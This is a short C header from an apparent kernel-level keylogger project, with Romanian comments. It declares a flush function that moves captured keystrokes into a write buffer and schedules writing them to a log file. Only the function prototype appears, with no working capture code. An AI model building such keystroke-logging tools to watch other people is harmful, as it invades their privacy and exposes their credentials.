#ifndef FLUSH_H
#define FLUSH_H
#include "struct_keylogger.h"

//aceasta functie se ocupa cu eliberarea bufferului de citire a tastelor si punerea datelor din acesta intr-un buffer de scriere
//tot aici se programeaza scrierea in fisierul de log prin schedule_work

void flush(struct KEYLOGGER*keylogger);

#endif